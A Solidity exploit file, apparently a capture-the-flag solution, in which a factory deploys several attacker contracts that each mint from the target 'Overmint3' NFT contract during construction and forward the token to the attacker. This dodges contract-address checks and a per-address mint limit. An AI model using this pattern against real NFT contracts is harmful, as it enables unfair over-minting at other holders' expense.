// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "./Overmint3.sol";

contract Overmint3Attacker {
    Overmint3 public overmint3;

    constructor(address _overmint3, address attacker) {
        overmint3 = Overmint3(_overmint3);
        overmint3.mint();
        overmint3.safeTransferFrom(address(this), attacker, overmint3.totalSupply());
    }
}

contract Overmint3AttackerFactory {
    Overmint3 target;
    uint256 counter = 1;

    constructor(address _overmint3, address _attacker) {
        target = Overmint3(_overmint3);
        while (counter < 6) {
            counter++;
            new Overmint3Attacker(_overmint3, _attacker);
        }
    }
}
